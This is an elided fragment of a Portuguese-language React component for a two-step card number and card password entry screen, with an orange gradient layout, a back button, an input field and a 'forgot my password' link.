...
const SenhaAcesso = () => {
  ...
  const [phase, setPhase] = useState<"cartao" | "senhaCartao">("cartao");
    ...
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
      ...
      <div className="px-5 pt-6 pb-4">
        <div className="flex items-center gap-4">
          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : navigate(-1)}>
        ...
        {phase === "cartao" ? (
          <>
            ...
            <input
              ...
              className="w-full border-b-2 border-[#FF6200] pb-2 outline-none text-base text-foreground mb-6"
              placeholder=""
            />
            ...
            <button className="text-[#FF6200] font-bold text-sm mb-4 text-left">
              Esqueci minha senha
            </button>
